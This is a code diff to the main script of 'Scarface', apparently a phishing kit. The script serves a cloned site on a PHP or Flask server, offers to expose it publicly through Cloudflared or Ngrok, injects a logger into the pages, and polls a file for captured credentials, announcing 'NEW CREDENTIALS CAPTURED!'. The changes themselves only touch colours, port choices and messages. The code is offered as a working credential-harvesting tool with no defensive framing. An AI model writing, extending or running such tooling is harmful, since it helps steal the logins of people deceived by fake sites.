@@ -18,10 +18,10 @@ from inject import inject_logger_to_all_html, inject_logger_to_php
 EXPOSE_DIR = os.path.join(SCARFACE_ROOT, 'expose')
 
 def prompt_for_port(default_port=8080):
-    print(f"\n{CYAN}Choose a port to host the server on:{RESET}")
+    print(f"\n{BLUE}Choose a port to host the server on:{RESET}")
     print(f"{CYAN}1.{RESET} 8080 (Default)")
-    print(f"{CYAN}2.{RESET} 5000")
-    print(f"{CYAN}3.{RESET} 80")
+    print(f"{CYAN}2.{RESET} 2000")
+    print(f"{CYAN}3.{RESET} 5000")
     print(f"{CYAN}4.{RESET} Custom")
     while True:
         try:
@@ -29,9 +29,9 @@ def prompt_for_port(default_port=8080):
             if choice == 1:
                 return 8080
             elif choice == 2:
-                return 5000
+                return 2000
             elif choice == 3:
-                return 80
+                return 5000
             elif choice == 4:
                 port = input(f"{BLUE}Enter custom port (1024-65535):{RESET} ")
                 if port.isdigit() and 1024 <= int(port) <= 65535:
@@ -44,7 +44,7 @@ def prompt_for_port(default_port=8080):
             print(f"{RED}[ERROR] Enter a number{RESET}")
 
 def expose_menu():
-    print(f"\n{BOLD}{CYAN}Expose to the internet{RESET}")
+    print(f"\n{BOLD}{BLUE}Expose to the internet{RESET}")
     print(f"{CYAN}developer: zerosocialcode | {BOLD}Scarface{RESET}\n")
     print(f"{CYAN}1.{RESET} Cloudflared (Cloudflare Tunnel)")
     print(f"{CYAN}2.{RESET} Ngrok")
@@ -86,9 +86,9 @@ def print_credentials(site_name):
             return
     if not creds:
         return
-    print(f"\n{BOLD}{GREEN}Latest Captured Credentials:{RESET}")
+    print(f"\n{BOLD}{BLUE}Latest Captured Credentials:{RESET}")
     for i, cred in enumerate(creds[-5:][::-1], 1):  # Show last 5 entries
-        print(f"\n{CYAN}{i}. Time: {cred.get('timestamp', 'N/A')}{RESET}")
+        print(f"\n{BLUE}{i}. Time: {cred.get('timestamp', 'N/A')}{RESET}")
         data = cred.get('data', {}) or cred.get('form_data', {})
         if not data and 'raw' in cred:
             print(f"   {BLUE}raw:{RESET} {cred['raw']}")
@@ -112,7 +112,7 @@ def monitor_credentials(site_name):
                 last_count = len(json.load(f))
         except json.JSONDecodeError:
             last_count = 0
-    print(f"\n{BOLD}{GREEN}Waiting for credentials... (Ctrl+C to stop){RESET}")
+    print(f"\n{BOLD}{BLUE}Waiting for credentials... (Ctrl+C to stop){RESET}")
     try:
         while True:
             with open(credentials_file, 'r') as f:
@@ -121,7 +121,7 @@ def monitor_credentials(site_name):
                 except json.JSONDecodeError:
                     current_count = 0
             if current_count > last_count:
-                print(f"\n{BOLD}{GREEN}NEW CREDENTIALS CAPTURED!{RESET}")
+                print(f"\n{BOLD}{BLUE}NEW CREDENTIALS CAPTURED!{RESET}")
                 print_credentials(site_name)
                 last_count = current_count
                 # Play notification sound if available
@@ -158,12 +158,12 @@ def main():
     try:
         if site_type == "php":
             php_proc, actual_port = launch_php_server(selected_site_dir, main_file, listen_port)
-            print(f"{GREEN}PHP server started on port {actual_port}{RESET}")
+            print(f"{BLUE}Server started on port {actual_port}{RESET}")
         else:
             main_file_rel = os.path.relpath(main_file, selected_site_dir)
             site_credentials_dir = os.path.join(CREDENTIALS_DIR, selected_site_name)
             flask_proc = launch_flask_server(selected_site_dir, main_file_rel, site_credentials_dir, listen_port)
-            print(f"{GREEN}Flask server started on port {listen_port}{RESET}")
+            print(f"{BLUE}Server started on port {listen_port}{RESET}")
     except Exception as e:
         print(f"{RED}Failed to start server: {e}{RESET}")
         sys.exit(1)
@@ -185,7 +185,7 @@ def main():
         sys.exit(0)
     # Start credential monitoring
     monitor_credentials(selected_site_name)
-    print(f"\n{GREEN}Goodbye from Scarface!{RESET}")
+    print(f"\n{BLUE}Goodbye from Scarface!{RESET}")
     sys.exit(0)
 
 if __name__ == "__main__":
